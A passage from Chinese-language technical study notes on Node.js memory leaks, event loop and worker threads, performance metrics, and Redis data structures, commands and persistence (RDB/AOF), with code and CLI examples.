Leak）是指程序中已动态分配的堆内存由于某种原因程序未释放或无法释放，造成系统内存的浪费，导致程序运行速度减慢甚至系统奔溃等严重后果。 全局变量，未声明的变量或挂在全局global下的变量不会自动回收，将会常驻内存直到直到进程退出才会释放，除非通过delete或者重新赋值为undefined/null解决之间的引用关系，才会被回收。 闭包，也是一个常见的内存泄露问题，闭包会引用父级函数中的变量，如果闭包得不到释放，闭包引用的父级变量也不会释放从而导致内存泄露 例如： 12345678910111213141516var theThing = null;var replaceThing = function()&#123; var originalThing = theThing; var unused = function()&#123; if(originalThing)&#123; console.log('hi') &#125; theThing = &#123; longStr:new Array(1000000).join('*'), someMethod:function()&#123; console.log(someMessage) &#125; &#125; &#125;&#125;setInterval(replaceThing,1000) 代码运行时，每次执行replaceThing方法都会生成一个新的对象，但是之前的对象没有释放导致的内存泄露。 慎将内存作为缓存 通过内存来做缓存是最快的实现方式，缓存中的存储的键越多，长期存活的对象就越多，垃圾回收时将这些对象做无用功。 12345678910111213141516// 下面一个获取用户Token的例子，memoryStore对象会随着用户数的增加而增长，当启动多个线程或者部署在多台机器会造成每个进程都保存一份，显然是资源的浪费，最好是通过Redis做共享const memoryStore = new Map();exports.getUserToken = function(key)&#123; const token = memoryStore.get(key); if(token &amp;&amp; Date.now() - token.now &gt; 2 * 60)&#123; return token; &#125; const dbToken = db.get(key); memoryStore.set(key,&#123; now:Date.now(), val:dbToken &#125;); return token;&#125; 模块私有变量内存常驻 加载一个模块代码之前，Nodejs会使用一个如下的函数封装器将其封装，保证了顶层的变量（var,const,let）在模块范围内，而不是全局对象。这个时候就会形成一个闭包，在require时会被加载一次，将exports对象保存在内存中，直到进程退出才会回收，这个将会导致的是内存常驻，所以避免一些没必要的模块加载，否则也会造成内存增加 1234567891011121314(function(exports,require,module,__filename,__dirname)&#123; // 模块的代码实际上在这里&#125;)// 所以建议对模块的引用仅在头部初次加载之后用const缓存起来，而不是在使用时每次都去加载一起。// 推荐const a = require('a.js');function test()&#123; a.run();&#125;// 不推荐function test()&#123; require('a.js').run();&#125; 事件反复监听 NodeJs中对一个事件反复监听则会报下面的错误，实际上使用的EventEmitter类，包含一个listeners数组，默认为10个监听器超出这个数则会报警，用于发现内存泄露，也可以通过emitter.setMaxListeners()方法为指定的EventEmitter实例修改限制 1MaxListenersExceededWarning：Possible EventEmitter memory leak detected, 11 connect added.Use emitter.setMaxListeners() to increase limit 其他注意事项 使用定时器setInterval时记得使用对应的clearInterval进行清除。因为setInterval执行完之后会返回一个值且不会自动释放，另外还有map/filter等对数组进行操作，每次操作之后都会创建一个新的数组，将会占用内存，如果单纯的遍历map可以用forEach。 插件缓存 [Cache] memory-fs 将文件写入内存 [Cache] Memory Cache [Cache] Node Cache 定时任务 [Schedule] node-schedule [Schedule] Agenda 将Node中的定时任务存储在数据库中（官方推荐MongoDB） [Schedule] Node.js结合RabbitMQ延迟队列实现定时任务 模板引擎 [Template] Ejs [Template] Handlebarsjs [Template] Jade 框架 [Framework] Express 中文版、Express of English Version [Framework] Koa 中文版、Koa of English Version [Framework] Egg 中文版、Egg of English Version [Framework] Nest.js 中文版、Nest.js ORM [typeorm] typeorm 【右上角切换中文】 [sequelize] sequelize [prisma] prisma 性能指标QPS QPS（Query Per Second）指每秒查询量，规定时间内所能处理的流量大小，通常QPS值越大服务器的吞吐量也就越大，相对服务器负荷也会越高 QPS=并发量/平均响应时间并发量 = QPS * 平均响应时间 TPS TPS（TransactionPerSecond）指每秒事物处理量，每秒钟系统所能处理的交易或事务的数量，用来形容系统的性能。 两者区别 一次下单请求，访问一次创建接口产生一次TPS,对于服务器的请求可能会产生多次，比如查询用户地址信息、商品数据信息、商品报价信息，这些请求计入QPS,也就是产生了3次QPS 系统扩容评价根据二八法则来评估系统扩容需要多少台机器，二八法则即20%的时间承载80%的流量，把20%的时间称为峰值时间，换算公式： 12(总PV数 * 80%) / (每天描述 * 20%) = 峰值时间每秒请求数峰值时间内每秒请求数（QPS）/单台机器QPS = 需要的机器 假设有1000wPV,总共需要的QPS为多少？ 1(1000000 * 0.8) / (24 * 60 * 60 * 0.2) = 463(QPS) 假设每台机器支撑100QPS，则共需要的机器为 1463(总有QPS)/100(单机QPS) = 5(约需要5台机器) Nodejs CPU使用率os.cups()数据指标返回的对象数组中有一个times字段，包含了user/nice/sys/idle/irq几个指标数据，分别代表CPU在用户模式、良好模式、系统模式、空闲模式、中断模式下话费的毫秒数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546[ &#123; model: 'Intel(R) Core(TM) i5-4590 CPU @ 3.30GHz', speed: 3292, times: &#123; user: 151474100, nice: 0, sys: 95311197, idle: 2258535287, irq: 2136605 &#125; &#125;, &#123; model: 'Intel(R) Core(TM) i5-4590 CPU @ 3.30GHz', speed: 3292, times: &#123; user: 84900939, nice: 0, sys: 65104926, idle: 2355314423, irq: 874869 &#125; &#125;, &#123; model: 'Intel(R) Core(TM) i5-4590 CPU @ 3.30GHz', speed: 3292, times: &#123; user: 144337320, nice: 0, sys: 112618416, idle: 2248364428, irq: 699602 &#125; &#125;, &#123; model: 'Intel(R) Core(TM) i5-4590 CPU @ 3.30GHz', speed: 3292, times: &#123; user: 110066333, nice: 0, sys: 84988268, idle: 2310265437, irq: 897333 &#125; &#125;] 定义方法getCPUInfo用来获取系统CPU信息，提供了CPU利用率的实时监控，这个实时不是绝对的实时，会有时差，下面实现中默认设置的1秒钟，可以通过Options.ms进行调整 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263const os = require('os');const sleep = ms =&gt; new Promise(resolve =&gt; setTimeout(resolve, ms));class OSUtils &#123; constructor() &#123; this.cpuUsageMSDefault = 1000; // CPU 利用率默认时间段 &#125; /** * 获取CPU信息 * @return &#123;Object&#125; CPU信息 */ _getCPUInfo() &#123; const cpus = os.cpus(); let user = 0, nice = 0, sys = 0, idle = 0, irq = 0, total = 0; for (let cpu in cpus) &#123; const times = cpus[cpu].times; user += times.user; nice += times.nice; sys += times.sys; idle += times.idle; irq += times.irq; &#125; total += user + nice + sys + idle + irq; return &#123; user, sys, idle, total &#125;&#125; /** * 获取某时间段CPU利用率 * @param &#123;Number&#125; Options.ms [时间段，默认是1000ms，即1秒钟] * @param &#123;Boolean&#125; Options.percentage [true（以百分比结果返回）| false] * @return &#123;Promise&#125; */ async getCPUUsage(options = &#123;&#125;) &#123; const that = this; let &#123; cpuUsageMS, percentage &#125; = options; cpuUsageMS = cpuUsageMS || that.cpuUsageMSDefault; const t1 = that._getCPUInfo(); // t1时间点的 CPU信息 await sleep(cpuUsageMS); const t2 = that._getCPUInfo(); // t2时间点的 CPU信息 const idle = t2.idle - t1.idle; const total = t2.total - t1.total; let usage = 1 - idle / total; if (percentage) usage = (usage * 100.0).toFixed(2) + '%'; return usage; &#125;&#125; 使用方式： 12345const osUtils = new OSUtils()osUtils.getCPUUsage(&#123; percentage: true &#125;).then(cpuUsage =&gt; &#123; console.log('CPU 利用率', cpuUsage)&#125;); NodeJs与Event Loopnode之前的世界，多线程服务器中，Web应用程序是用一个client/server(客户端/服务端)模式所编写的，其中client将向server请求资源并且将会根据这个资源以响应，server仅在client请求时做出响应，并在每次响应后关闭连接。这种模式是有效的，因为对服务器的每一个请求都需要时间和资源（内存、CPU等等），服务器必须完成上一个请求，才能接受下一个请求。需要同时处理N个请求，服务器就需要N个线程，如果有N+1个请求，就必须等N个线程中的任何一个可用。 服务器中的线程不是唯一的问题，一个线程为什么不能同时处理2个或者更多请求，是因为阻塞了Input/Output操作。 操作 CPU时钟周期数(ticks) CPU寄存器 3 L1 Cache(一级缓存) 8 L2 Cache(二级缓存) 12 RAM(随机存取存储器) 150 Disk（磁盘） 30 000 000 NetWork（网络） 250 000 000 时钟周期也称为tick/clock cycle/clock period等，指一个硬件在被使用过程中，被划分为多个时间周期，当我们需要比较不同硬件性能时，就在不同硬件上测试同一个软件，观察它们的时钟周期时间和周期指数，如果时钟周期越长、周期越多，就意味着这个硬件需要的性能较低。 Event Loop事件循环事件循环实际上是一个无限循环，并且线程里唯一可用的。 1234567891011121314151617181920static void StartNodeInstance(void* arg)&#123; // ... &#123; SealHandleScope seal(isolate); bool more; do&#123; v8::platform::PumpMessageLoop(default_platform,isolate); more = uv_run(env-&gt;event_loop(),UV_RUN_ONCE); if(mode == false)&#123; v8::platform::PumpMessageLoop(default_platform,isolate); EmitBeforeExit(env); more = uv_loop_alive(env-&gt;event_loop()); if(uv_run(env-&gt;event_loop),UV_RUN_NOWAIT)!=0)&#123; more = true &#125; &#125; &#125;while(more == true) &#125;&#125; 事件循环经历6个阶段，所有阶段的执行被称为tick 1timers-&gt;pending callbacks -&gt;idle,prepare-&gt;poll-&gt;check-&gt;close callbacks timers：这个阶段执行定时器setTimeout和setInterval的回调函数 pending callbacks：几乎所有的回调都在这里执行，除了close回调，定时器timers阶段的回调和setImmediate idle,prepare：仅在内部使用 poll：检索新的I/O事件，适当时Node在此处阻塞 check：setImmediate回调函数将在这里执行 close callbacks：一些准备关闭的回调函数，如 socket.on(‘close’,…) 当Event loop需要执行I/O操作时，它将从一个池（通过Libuv库）中使用系统线程，当这个作业完成时，回调将排队等待在pending callbacks阶段被执行 CPU密集型任务问题设定一个函数，给定一个数，计算在一个数组中返回N个质数 12345678910111213141516171819202122232425262728293031323334353637383940// primes.jsfunction isPrime(n) &#123; for (let i = 2, s = Math.sqrt(n); i &lt;= s; i++) if (n % i === 0) return false; return n &gt; 1;&#125;function nthPrime(n) &#123; let counter = n; let iterator = 2; let result = []; while (counter &gt; 0) &#123; isPrime(iterator) &amp;&amp; result.push(iterator) &amp;&amp; counter--; iterator++; &#125; return result;&#125;module.exports = &#123; isPrime, nthPrime &#125;;const http = require('http');const url = require('url');const primes = require('./primes');// index.jshttp.createServer((req, res) =&gt; &#123; const &#123; pathname, query &#125; = url.parse(req.url, true); if (pathname === '/primes') &#123; const result = primes.nthPrime(query.n || 0); res.setHeader('Content-Type', 'application/json'); res.write(JSON.stringify(result)); res.end() &#125; else &#123; res.statusCode = 404; res.write('Not Found'); res.end(); &#125;&#125;).listen(9898);// index.js 创建一个服务并在每次请求 /primes这个库，通过query传递参数，假设有3个客户端访问这个非阻塞API,第一个页面请求5个质数，第二个1000个，第三个100000000个，会发现，第三个请求时，客户端就会被阻塞，因为质数会占用大量的CPU,主线程忙于执行密集型的代码，将无法做其他事情，还有Node引入了工作线程 工作线程工作线程对于执行CPU密集型的javascript操作非常有用，在I/O密集型的工作中用途不大，NodeJs内置的异步I/O操作比工作线程效率更高 修改代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263const &#123; workerData, parentPort &#125; = require('worker_threads');function isPrime(n) &#123; for (let i = 2, s = Math.sqrt(n); i &lt;= s; i++) if (n % i === 0) return false; return n &gt; 1;&#125;function nthPrime(n) &#123; let counter = n; let iterator = 2; let result = []; while (counter &gt; 0) &#123; isPrime(iterator) &amp;&amp; result.push(iterator) &amp;&amp; counter--; iterator++; &#125; return result;&#125;parentPort.postMessage(nthPrime(workerData.n))// index.jsconst http = require('http');const url = require('url');const &#123; Worker &#125; = require('worker_threads')http.createServer((req, res) =&gt; &#123; const &#123; pathname, query &#125; = url.parse(req.url, true); if (pathname === '/primes') &#123; const worker = new Worker('./primes.js', &#123; workerData: &#123; n: query.n || 0 &#125; &#125;) worker.on('error', () =&gt; &#123; res.statusCode = 500; res.write('Oops there was an error'); res.end(); &#125;) let result; worker.on('message', (message) =&gt; &#123; result = message; &#125;) worker.on('exit', () =&gt; &#123; res.setHeader('Content-Type', 'application/json'); res.write(JSON.stringify(result)); res.end() &#125;) &#125; else &#123; res.statusCode = 404; res.write('Not Found'); res.end(); &#125;&#125;).listen(9898);// index.js在每个请求中创建一个Worker实例，在一个工作线程中加载并执行primes文件，当这个质数列表计算完成买这个message将会被触发，接受信息并赋值result，由于这个job已完成，将会再次触发exit事件，允许主线程发送数据到客户端// primes导入 workerData(从主线程传递参数)，parentPort是向主线程发送消息的方式// 主线程将不会再阻塞，但是生成工作线程并不是最佳实践，创建新线程并不便宜，一定要先创建一个线程池 RedisRedis是一个免费开源、基于内存的高性能Key-Value数据库，具有速度快，数据持久化，多语言和多功能等特性。 速度快：10w OPS能力，单线程模型，数据存于内存中，注意一次只能运行一次命令，使用过程拒绝使用慢命令，例如keys/flushall/flushdb/slow lua script/mutil/exec等 持久化：基于内存模型，断电后或者服务重启会造成数据丢失，针对这个问题，提出两种数据持久化策略，分别为RDB和AOF,会将Redis在内存中的数据异步更新到磁盘中，实现数据的持久化功能。 丰富的数据类型：除了常见的String/HashTable/List/Set/Zset之外还有BitMaps(位图)、HyperLogLog（超小内存唯一计数） 多语言：基于TCP的通信方式，支持Node.Js/Python/Java/Ruby/Lua等。 多功能：提供了发布订阅、简单的事务功能、pipeline提高客户端并发效率。另外在Redis中所有单个命令操作都是原子性的，如果想对多个命令一起操作，可以借助Lua脚本（实现自定义命令，保证原子性） 通用命令 keys * ：遍历所有key，生产环境不建议使用，时间复杂度O(n) dbsize key：计算key的总数，Redis内置了这个计数器，会实时更新key的总数，时间复杂度O(1) exists key：检查key是否存在，时间复杂度为O(1) expire key seconds：key在指定second后过期，时间复杂度O(1) ttl key：key剩余的过期时间，时间复杂度O(1) persist key: 去掉key的过期时间，时间复杂度O(1) type key：查看key的类型，时间复杂度O(1) 数据结构字符串最大限制512MB,适用于缓存、计算器、分布式锁等，字符串类型的值可以为简单的字符串、JSON、XML、数组甚至是二进制（视频） 常见命令 命令 含义 时间复杂度 set get del 对key进行设置、读取、删除 O(1) incr decr 计数 O(1) incrby decrby 对计数设置增量 O(1) setnx key存在不做任何操作 O(1) setex key存在做操作与setnx相反 O(1) getset 设置新值返回旧值 getset key newValue O(1) mset mget 多个key进行设置、读取 O(1) set 12345set key value [ex seconds] [px milliseconds] [nx|xx]// seconds：单位(秒)// milliseconds:单位（毫秒）// nx:key 存在不做任何操作，等价于setnx// xx:key 存在做操作与nx相反，相当于setex mget mset mget/mset可以批量获取或设置值，如果使用get多次读取数据等价于n次网络时间+n次命令时间，这种方法可以用mget优化，等价于1次网络时间+n次命令时间，这是一个O(n)操作，避免命令过多客户端阻塞 123456127.0.0.1:6379&gt; mset key1 val1 key2 val2 key3 val3OK127.0.0.1:6379&gt; mget key1 key2 key31) "val1"2) "val2"3) "val3" incr decr incrby decrby incr：自增 decr：自减 incrby：指定数字自增 decrby：指定数字自减 incrbyfloat：指定浮点数自增 12345incr keydecr keyincrby key incrementdecrby key decrementincrbyfloat key increment 应用场景缓存，对城市列表数据进行缓存 1234567891011// 伪代码function cityList()&#123; const redisKey = 'city'; let cities = redis.get(redisKey) if(!cities)&#123; cities = mongo.getCityList(); redis.set(redisKey,JSON.stringify(cities)); &#125; return cities;&#125; 分布式锁 1set key value [EX seconds] [PX milliseconds] [NX|XX] 计数器，网站的PV/UV统计，文章点赞、阅读量，视频网络的播放量，Redis提供的incr命令可实现计数器功能，性能好复杂度为O(1) 1234const incrPageViewsCounter = pageId =&gt;&#123; const key = `page:views:$&#123;pageId&#125;`; return redis.incr(key);&#125; Session存储，Redis不会因为服务器重启导致Session数据丢失，具有数据持久化功能。 限流，短信发送为了避免接口被频繁调用，通常要在指定时间内避免重复发送 1234567891011121314const SMSLimit = async phone =&gt;&#123; const key = `sms:limit:$&#123;phone&#125;`; const result = await redis.set(key,1,'EX',60,'NX'); if(result === null)&#123; console.log('60s 内无法再次发送验证码') return false &#125; console.log('可以发送') return true;&#125;SMSLimit(18800000000) 哈希哈希结构有一个特点，所有命令都是H开头，hash类型其值本身就由一个或多个filed-value构成 1234567hashKey = &#123; filed1:value1, filed2:value2&#125;// 优：节省空间，可以部分更新// 缺：不支持TTL设置，Redis中过期时间只针对顶级Key,无法对Hash Key的field设置过期时间，只能对整个Key 通过expire设置// 注意：在使用hgetall的时候注意，集合很大将会浪费性能 常见命令 命令 含义 时间复杂度 hset 对key的field进行设置 O(1) hget 获取key指定的field O(1) hdel 删除key指定的field O(1) hincrby hincrbyfloat 类似于incrby incryfloat 这个操作的是field O(1) hmset hmget 对多个filed value 设置 读取 O(n) hgetall 获取key的所有field value O(n) hvals 获取key的所有value O(n) hkeys 获取key的所有fields O(n) 12345678910111213141516127.0.0.1:6379&gt; hset student name Jack(integer) 1127.0.0.1:6379&gt; hget student name"Jack"127.0.0.1:6379&gt; hmset student age 18 sex manOK127.0.0.1:6379&gt; hmget student sex age1) "man"2) "18"127.0.0.1:6379&gt; hgetall student1) "name"2) "Jack"3) "age"4) "18"5) "sex"6) "man" 应用场景hash适合将一些数据存储在一起，例如缓存用户信息，与字符串不同的是，hash可以对用户信息结构中的每个字段单独存储，当需要获取信息时可以仅获取需要的部分字段。如果用字符串存储，两种方式，一种是将信息拆分为多个键（每个属性一个键）来存储，占用过的key同时占用空间；另外一种方式是序列化字符串存储，这种方式如果去数据只能全部取出并且还要进行反序列化，序列化/反序列化也有一定的内存开销 123456789101112131415161718192021222324252627282930313233// 缓存用户信息例子：// 模拟查询Mongo数据const mongo = &#123; getUserInfoByUserId:userId =&gt;&#123; return&#123; name:'Jack', age:19 &#125; &#125;&#125;// 获取用户信息async function getUserInfo(userId)&#123; const key = `user:$&#123;userId&#125;`; try&#123; // 从缓存获取数据 const userInfoCache = await redis.hgetall(key); // 如果 userInfoCache为空，返回值为&#123;&#125; if(Object.keys(userInfoCache).length ===0)&#123; const userInfo = mongo.getUserInfoByUserId(userId); await redis.hmset(key,userInfo); await redis.expire(key,120); return userinfo; &#125; return userInfoCache; &#125;catch(err)&#123; console.error(err); throw err; &#125;&#125;getUserInfo(1) 列表Redis的列表用来存储字符串元素的集合，基于Linked Lists实现，意味着插入、删除操作非常快，时间复杂度为O(1),索引很慢，时间复杂度为O(n) Redis列表命令都是L开头，在实际运用中可以作为队列或者栈 Stack（栈）：后进先出，实现命令lpush+lpop Queue（队列）：先进先出，实现命令lpush+rpop Capped Collection(有限集合)：lpush+ltrim Message Queue(消息队列)：lpush+brpop 常见命令 命令 含义 时间复杂度 lpush rpush 列表左端/右端插入一个值 O(1~n) linsert 列表指定的值前/后插入新值 O(n) lpop rpop 列表左侧或者右侧弹出一个值 O(1) blpop brpop lpop rpop 的阻塞版本，需设置timeout O(1) ltrim 按照索引范围修剪列表 O(n) lrange 获取指定范围内的元素列表 O(n) llen 获取列表长度 O(1) lset 设置列表指定索引值为新值 O(n) 1234567891011121314151617181920212223242526272829303132333435363738394041424344# 列表左侧加入三个元素127.0.0.1:6379&gt; lpush languages JavaScript Python Go(integer) 3# 获取列表长度127.0.0.1:6379&gt; llen languages(integer) 3# 获取指定范围内元素列表 从左到右 start/end-&gt;0/N-1 从右到左 start/end-&gt;-1/-N127.0.0.1:6379&gt; lrange languages 0 21) "Go"2) "Python"3) "JavaScript"# 列表右侧插入元素127.0.0.1:6379&gt; rpush languages TypeScript(integer) 4# 查看列表的元素127.0.0.1:6379&gt; lrange languages 0 31) "Go"2) "Python"3) "JavaScript"4) "TypeScript"# 列表左端移除一个元素127.0.0.1:6379&gt; lpop languages"Go"# 列表右端移除一个元素127.0.0.1:6379&gt; rpop languages"TypeScript"# 谁的那个列表指定索引值为新值127.0.0.1:6379&gt; lset languages 1 JSOK# 列表指定的值前/后插入新值127.0.0.1:6379&gt; linsert languages after JS Nodejs(integer) 3# 按照索引范围修剪列表（元素截取）127.0.0.1:6379&gt; ltrim languages 1 2OK 应用场景消息队列，Redis List结构的lpush与brpop命令可实现消息队列，lpush命令是从左端插入数据，brpop命令是从右端阻塞式的读取数据，阻塞读过程中如果队列中没有数据，会立即进入休眠直到数据到来或超过设置的timeout时间，会立即醒过来 123456789async function test()&#123; const key = 'languages'; // 阻塞读，timeout为5秒钟 const result = await redis.brpop(key,5); console.log(result);&#125;test();test(); 集合Redis集合类型可用来存储多个字符串元素，和列表不同，集合元素不允许重复，集合中的元素是无须的，也不能通过索引下标获取元素。Redis集合的命令都是S开头 常用命令 命令 含义 时间复杂度 sadd 集合中添加元素，如果元素重复则添加失败 O(1) srem 删除集合中的元素 O(1) scard 计算集合中的元素个数 O(1) sismember 判断集合中是否存在指定元素 O(count) srandmember 随机从集合中返回指定元素 O(n) sinter 求集合交集 sunion 求集合并集 sdiff 求集合差集 123456789101112131415161718192021222324252627282930313233343536373839404142434445# 集合中添加元素127.0.0.1:6379&gt; sadd languages2 Nodejs JavaScript(integer) 2# 计算集合中元素个数127.0.0.1:6379&gt; scard languages2(integer) 2# 判断集合中是否存在指定元素 1 存在 0不存在127.0.0.1:6379&gt; sismember languages2 Nodejs(integer) 1127.0.0.1:6379&gt; sismember languages2 Nodejs1(integer) 0# 随机从集合中返回n个元素127.0.0.1:6379&gt; srandmember languages2 21) "JavaScript"2) "Nodejs"127.0.0.1:6379&gt; srandmember languages2 31) "JavaScript"2) "Nodejs"# 设置用户1 使用的语言127.0.0.1:6379&gt; sadd user:1 Nodejs JavaScript(integer) 2# 设置用户2 使用的语言127.0.0.1:6379&gt; sadd user:2 Nodejs Python(integer) 2# 求 user:1与 user:2 交集127.0.0.1:6379&gt; sinter user:1 user:21) "Nodejs"# 求user:1 与 user:2 并集127.0.0.1:6379&gt; sunion user:1 user:21) "JavaScript"2) "Nodejs"3) "Python"# 求user:1 与 user:2 差集127.0.0.1:6379&gt; sdiff user:1 user:21) "JavaScript" 应用场景抽奖，Redis的结合有去重功能，一些抽奖类项目中可以存储中奖的用户Id,能够保证同一个用户Id不会中奖两次 1234567891011121314async function test(userId)&#123; const key = 'luck:users'; const result = await redis.sadd(key,userId); // 如果元素存在，返回0表示未添加成功 if(result === 0)&#123; console.log('您已中间一次，无法再次参与'); return false &#125; console.log('恭喜您中奖') return true;&#125;test(1); 计算用户共同感兴趣的商品，sadd与sinter可以用来统计用户共同感兴趣的商品，sadd保存每个用户喜欢的商品标签，使用sinter对每个用户感兴趣的商品标签求交集 有序集合Redis有序集合zset保留了集合set元素不能重复的特征之外，在有序集合的元素中是可以排序的，与列表使用索引下标不同的是有序集合是有序集合给每个元素设置一个分值（score）作为排序的依据 Redis有序集合是Z开头的 常见命令 命令 含义 时间复杂度 zadd 集合中添加元素 O(logN) zrem 集合中删除元素 O(1) zscore 返回集合的分数 O(1) zincrby 增加或者减少集合的分数 O(1) zcard 返回元素的个数 O(1) zadd 123456zadd key [NX|XX] [CH] [INCR] score member [sroce member ...]# [NX|XX]：NX member必须不存在才添加成功，用户Create;XX,member 必须存在才能更新成功，用于UPDATE# [CH]：返回此次操作后有序集合元素和分数发生的变化# [INCR]：对score做增加，相当于 zincrby# score：代表分数（排序）# member：成员 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# 有序集合 grages 中添加3个元素127.0.0.1:6379&gt; zadd grades NX 80 xiaoming 75 xiaozhang 85 xiaoli(integer) 3# 查看成员 xiaozhang 分数127.0.0.1:6379&gt; zscore grades xiaozhang"75"# 更新成员 xiaozhang 分数127.0.0.1:6379&gt; zadd grades XX 90 xiaozhang(integer) 0# 再次查看成员xiaozhang分数127.0.0.1:6379&gt; zscore grades xiaozhang"90"# 查看成员排名# 分数从低到高127.0.0.1:6379&gt; zrank grades xiaozhang(integer) 2# 分数从高到低127.0.0.1:6379&gt; zrevrank grades xiaozhang(integer) 0# 增加成员分数127.0.0.1:6379&gt; zincrby grades 5 xiaozhang"95"# 返回指定范围成员排名，WITHSCORES可选参数，去掉则不返回分数127.0.0.1:6379&gt; zrange grades 0 2 WITHSCORES1) "xiaoming"2) "80"3) "xiaoli"4) "85"5) "xiaozhang"6) "95"# 返回指定分数范围内的成员列表127.0.0.1:6379&gt; zrangebyscore grades 85 1001) "xiaoli"2) "xiaozhang"# 删除指定成员127.0.0.1:6379&gt; zrem grades xiaoli(integer) 1 高级特性慢查询Redis整个生命周期：发送命令-&gt;排队-&gt;执行命令-&gt;返回结果，慢查询通常发生在执行命令阶段，可以通过日志查询系统slowlog进行问题定位跟踪 在配置文件中redis.conf设置： slowlog-max-len：表示慢查询最大的条数，默认128，保存在内存中，当超过预先设置的值后会将最早的slowlog删除，是个先进先出队列 slow-log-slower-than：慢查询阀值，默认10000微妙，只有命令执行时间大于该阀值才会被slowlog记录，如果记录所有命令将阀值设置为0 Redis是每秒万级别，设置阀值时候，默认为10000微秒（10毫秒），不要设置太大，建议1毫秒之下，才有意义。定期将慢查询持久化到其他数据库，便于排查。 慢查询命令： slowlog get [n]：获取慢查询队列 slowlog len：获取慢查询队列长度 slowlog reset：清空慢查询队列 pipeline核心1次网络请求处理n条命令，redis本身命令处理时间是微秒级别，pipeline主要减少网络传输要求 发布订阅角色：发布者（publisher）/订阅者（subscriber）/频道（channel）: 发布消息publish channel message 订阅消息 subscribe [channel]，可以订阅多个频道 取消订阅 unsubscribe [channel] BitMaps（位图）CEO用于地理位置定位，基于zset实现的： geoadd key longitude latitude member增加地理位置信息，例如：geoadd cities: 163.31 39.99 beijing geopos key member [member...],获取地理位置消息，例如geopos cities: beijing geodist key member1 member2 [unit]：获取两地址位置距离，unit为单位（m/km/mi/ft）,例如：geodist cities: beijing shanghai km 主从复制单机带来的问题机器故障、容量限制、QPS瓶颈，主从复制是一种一主多从的模式提供了数据副本，解决了单机带来的机器故障问题，另外主从分离模式还提供了Redis读的性能，也是高可用，分布式的基础。 所谓的主从复制就是一个Redis主节点拥有多个从节点，由主节点的数据单向复制到从节点，在一些读多写少的业务场景非常受用 数据持久化Redis数据存储都是内存里，对数据的更新异步的存储在磁盘里，在Redis中的数据持久化有两种策略，RDB快照，AOF日历 RDB把当前内存中的数据集快照写入磁盘，恢复时将快照文件直接读到内存里。 触发机制save和bgsave生成快照 save：使用save会造成客户端阻塞，它使用一种同步的方式生成RDB快照文件，因为Redis是单线程，如果save过程很长也会阻塞其他客户端的命令，在生产中是不建议使用的 bgsave：使用bgsave Redis会fork一个子进程来负责生成RDB文件，由于bgsave是异步进行的并不会阻塞其他客户端的命令，bgsave模式下阻塞阶段发生在fork过程中 持久化配置其中stop-writes-on-bgsave-error这个配置很重要，如果子进程(也就是备用经常)在后台生成快照失败，主经常会停止新的写入操作，也是为了保持数据一致性 12345678910111213141516171819# 持久化默认时间策略save 900 1 # 如果仅有1-9次更改操作，那么要900s才写入硬盘一次save 300 10 # 如果仅有10-9999次更改操作，那么要300s才写入硬盘一次save 60 10000 # 如果超过10000次更改操作，那么60s才会写入硬盘一次# RBD 文件名称，建议 dump-6379.rdbdbfilename dump.rdb# 工作目录（上面 dump-6379.rdb 文件保存目录）dir /data/soft/redis-5.0.5/data/# 备份进程出错，主进程停止写入stop-writes-on-bgsave-error yes# 是否压缩rdbcompression yes# 导入时是否检查rdbchecksum yes 1234567891011121314127.0.0.1:6379&gt; saveOK127.0.0.1:6379&gt; bgsaveBackground saving started# 服务端[35856] 02 Jul 10:01:02.999 * 1 changes in 3600 seconds. Saving...[35856] 02 Jul 10:01:03.063 * Background saving started by pid 58172[35856] 02 Jul 10:01:03.263 # fork operation complete[35856] 02 Jul 10:01:03.263 * Background saving terminated with success[35856] 02 Jul 10:30:56.240 * DB saved on disk[35856] 02 Jul 10:31:03.565 * Background saving started by pid 53904[35856] 02 Jul 10:31:03.705 # fork operation complete[35856] 02 Jul 10:31:03.705 * Background saving terminated with success 不足性能、时间耗时，存在不稳定性 RDB生成的过程就是将Redis内存中的dump到硬盘生成一个RDB文件，其实就是生成一个内存快照，save会造成阻塞，不建议生产环境去使用。besave的fork也是一个重量级操作，遵循copy-on-write（写入时复制）策略，新fork出的子进程会继续共享父进程的物理空间，使用COW技术可以避免不必要的资源分配，父进程的代码段和只读数据段都不允许修改，所以无需复制，当父进程处理些请求时会把要修改的页创建副本，而子进程在fork过冲中会共享父进程的内存快照 Copy on Write技术实现原理：fork之后，kernel把父进程中所有的内存页的权限都设为read-only,然后子进程的地址空间指向父进程。当父子进程都只读内存时，相安无事。当其中某个进程写入内存时，CPU硬件检测到内存页是read-only,于是触发页异常中间（page-fault），陷入kernel的一个终端例程。中断例程中，kernal就会把触发的异常的页复制一份，于是分子进程各自持有独立的一份 COW技术可以减少分配和复制大量资源时带来的瞬间延迟，减少不必要的资源分配。 如果在fork之后，父子进程还需要进行读写操作，那么会产生大量的分页错误（页异常中断page-fault），这样就得不偿失了 Redis会根据自定义时间策略或者定时任务手动执行besave进行快照备份，如果某个出现宕机会丢失部分数据 AOF以写日志的方式执行redis命令后，将数据写入AOF日志文件 可靠性fsyncredis命令写入过程，是先写入硬盘的缓冲区，缓冲区根据选择的策略写入到系统中，linux的glibc提供了fsync（init fd）函数可以将指定文件的内容强制从内核写入至磁盘，只要redis进程实时调用了fsync函数就可以保证AOF日志不丢失，由于fsync是一个磁盘I/O操作，所以不能每条redis指令都执行一次fsync，这样redis高性能就没有保证，有三种策略，默认推荐everysec策略： always：每条命令都会写入AOF中，保证数据不会丢失，但是I/O开销会很大 everysec：以每秒钟为单位将缓冲区中的数据写入到硬盘，如果出现故障可能会丢失1秒钟的数据，这个也是Redis的默认值 no：这个策略根据操作系统定义的进行写入，不需要操作，但同时也是不可控的。 重写将那些过期、重复的命令进行压缩减少，从而达到减少硬盘占用量，提高数据恢复速度 实现方式： bgrewriteaof:类似于RDB中的bgsave auto-aof-rewrite-min-size：配置AOF重写需要的最小尺寸 auto-aof-rewrite-percentage：配置AOF文件增长率 配置 123456789101112131415161718192021# 是否开启 aofappendonly yes# 文件名称appendfilename "appendonly-6379.aof"# 同步方式appendfsync everysec# aof 重写期间是否同步no-appendfsync-on-rewrite no# 重写触发配置auto-aof-rewrite-percentage 100auto-aof-rewrite-min-size 64mb# 加载 aof 时如果有错如何处理aof-load-truncated yes# 文件重写策略aof-rewrite-incremental-fsync yes 数据损坏修复“在过去曾经发现一些很罕见的 BUG 导致使用 